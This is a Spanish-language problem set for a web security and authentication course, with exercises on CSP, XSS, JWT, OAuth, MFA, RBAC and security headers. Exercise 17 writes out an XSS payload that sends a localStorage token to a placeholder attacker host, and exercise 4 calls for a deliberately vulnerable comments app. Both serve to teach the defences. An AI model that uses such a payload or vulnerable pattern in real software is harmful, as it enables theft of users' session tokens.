# Problem Set S-04 — Seguridad & Auth

## Sección A — Audit

1. Tomá un sitio que uses regularmente. Audit con [securityheaders.com](https://securityheaders.com) y [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com). Reportá:
   - Grade actual
   - Headers faltantes
   - Top 3 mejoras recomendadas

2. Auditá tu propia app deployada (la del capstone). Mismo análisis.

3. Encontrá un anti-patrón en código real (open source o tuyo): JWT en localStorage, validación solo en cliente, etc. Documentalo y proponé fix.

## Sección B — XSS

4. Construí una app simple "Comments" donde:
   - Usuarios pueden postear comentarios (text + opcional HTML).
   - Versión 1: vulnerable (innerHTML directo).
   - Versión 2: segura con DOMPurify para HTML, textContent para texto plano.
   - Demostrá el ataque en la versión 1 y la defensa en la 2.

5. Implementá un **CSP estricto** para una app React + Vite:
   - Sin `'unsafe-inline'`.
   - Con nonces para los scripts inline necesarios.
   - Reportar violaciones a `/csp-report`.
   - Que pase `csp-evaluator` sin warnings.

## Sección C — Auth

6. Implementá auth completa con email/password:
   - Backend: Express o Hono con JWT + refresh tokens (rotation).
   - Frontend: React con interceptor de fetch que refresca automático.
   - Access token en memoria (Zustand), refresh en cookie httpOnly.
   - Protected routes con `<ProtectedRoute />`.
   - Tests: login válido, login inválido, expiración, refresh.

7. Agregá **OAuth con Google** usando PKCE (sin librería de auth-as-a-service):
   - Documentá los 6 pasos del flow.
   - Manejá errores: user canceló, code inválido, network down.
   - Mergeá la cuenta OAuth con la cuenta email/password si ya existe.

8. Implementá **MFA con TOTP** (Time-Based One-Time Password):
   - Usuario habilita MFA → mostrar QR para Google Authenticator.
   - En login: pedir código de 6 dígitos.
   - Usar librería: `otpauth` o similar.

## Sección D — RBAC / ABAC

9. Implementá RBAC para una app de blog:
   - Roles: `admin`, `editor`, `author`, `reader`.
   - Permisos: `articles:read|write|delete`, `users:manage`, `settings:edit`.
   - Componente `<Can permission="articles:write">` que oculta children si no tiene permiso.
   - Hook `usePermission(perm)` que retorna boolean.

10. Migrá a ABAC para soportar:
    - Authors solo pueden editar SUS propios artículos.
    - Editors solo en sus categorías asignadas.
    - Multi-tenant: usuarios solo ven datos de su org.

11. Usá [CASL](https://casl.js.org/) para implementar el mismo modelo. Compará con tu implementación manual.

## Sección E — Headers de seguridad

12. Configurá los siguientes headers en una app deployada (Vercel, Netlify, o servidor propio):
    - `Strict-Transport-Security` (HSTS)
    - `Content-Security-Policy` estricto con nonces
    - `X-Content-Type-Options: nosniff`
    - `Referrer-Policy: strict-origin-when-cross-origin`
    - `Permissions-Policy` minimal
    - Verificá con securityheaders.com → Grade A o A+.

13. Configurá **Subresource Integrity (SRI)** para todos los scripts y estilos externos. Generá los hashes SHA-384.

## Sección F — Threats específicos

14. Implementá protección contra **open redirect**:
    - Al loguearse: `?redirect=` query param.
    - Validar que sea ruta relativa O dominio de allowlist.
    - Test: intentar redirect a `https://evil.com` → debe ir a `/` por default.

15. **Clickjacking defense**:
    - Setear `frame-ancestors 'none'` en CSP.
    - Implementá un test de Playwright que verifique que tu app NO se puede embeber en iframe externo.

16. **Rate limiting** en login:
    - Backend: max 5 intentos por IP / 15 min.
    - Frontend: feedback claro cuando rate limit hit.
    - Implementación opcional con Redis o en memoria.

## Sección G — Token theft scenario

17. Simulá un escenario de **token theft via XSS**:
    - Versión vulnerable: token en localStorage.
    - Atacante inyecta `<script>fetch('https://evil/steal?t='+localStorage.getItem('token'))</script>` (ej. via comentario sin sanitizar).
    - Demostrar el robo.

18. Versión defendida:
    - Token en cookie httpOnly.
    - CSP estricto.
    - Comentarios sanitizados con DOMPurify.
    - Demostrar que el ataque ya no funciona.

## Desafío

19. **App SaaS multi-tenant completa**:
    - Auth: email/password + OAuth Google + MFA opcional.
    - Multi-tenancy: cada user pertenece a una org, datos aislados.
    - RBAC con 4 roles + permisos granulares.
    - Audit log: quién hizo qué cuándo.
    - Headers de seguridad grade A+.
    - CSP estricto sin `'unsafe-inline'`.
    - Tests de seguridad con Playwright (XSS, CSRF, IDOR).

20. **Threat model document**:
    - Diagrama de la app con boundaries.
    - Lista de assets a proteger (datos, tokens, etc.).
    - Lista de threats por capa (frontend, API, DB, infra).
    - Mitigaciones aplicadas para cada uno.
    - Risks aceptados con justificación.

    Esto es lo que un security engineer escribe. Como senior, deberías saber producirlo.

## Entregable

Repo `cs-fe-senior-s04-security` con:
- App SaaS completa (ej. 19).
- Threat model document (ej. 20).
- Audit reports (ej. 1-2) en formato Markdown.
- Demo del XSS attack + defense (ej. 17-18).

Esto es portfolio que un equipo serio mira con respeto.
